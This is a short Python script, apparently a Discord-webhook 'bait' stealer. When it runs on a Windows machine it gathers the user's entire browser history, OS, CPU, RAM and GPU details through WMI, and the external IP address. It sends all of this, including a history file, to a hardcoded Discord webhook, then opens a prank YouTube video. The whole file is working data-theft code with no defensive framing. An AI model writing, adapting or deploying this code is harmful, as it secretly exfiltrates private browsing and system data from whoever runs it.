from asyncore import write
from math import ceil
import requests
from discord import Webhook, RequestsWebhookAdapter
import wmi
import urllib.request
from browser_history import get_history
import discord

outputs = get_history()

# his is a list of (datetime.datetime, url) tuples
his = outputs.histories

webhook = Webhook.from_url("https://discord.com/api/webhooks/967788713486712872/IWP3nLqUNphUg821lQyN6k5ZCfuMsE8nfv5duy3huNbE_EGjtc3FrxLc-kVbNf7mMT7w", adapter=RequestsWebhookAdapter())
webhook.send("```ini\n[-- Begin Bait --]\n```")


computer = wmi.WMI()
computer_info = computer.Win32_ComputerSystem()[0]
os_info = computer.Win32_OperatingSystem()[0]
proc_info = computer.Win32_Processor()[0]
gpu_info = computer.Win32_VideoController()[0]

webhook.send('-- information extracted from WMI --')

os_name = os_info.Name.encode('utf-8').split(b'|')[0]
os_version = ' '.join([os_info.Version, os_info.BuildNumber])
system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB

webhook.send('OS Name: {0}'.format(os_name.decode('utf-8')))
webhook.send('CPU: {0}'.format(proc_info.Name))
webhook.send('RAM: {0} GB'.format(ceil(system_ram)))
webhook.send('Graphics Card: {0}'.format(gpu_info.Name))


external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
webhook.send('External IP: {0}'.format(external_ip))
print('-'*10)
open('a.txt', 'w').write('\n'.join(map(str, his)))
with open('a.txt', 'rb') as f:
    my_file = discord.File(f)
webhook.send('Browser History ---------------------------', file=my_file)

import webbrowser

url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

webbrowser.open(url, new=0, autoraise=True)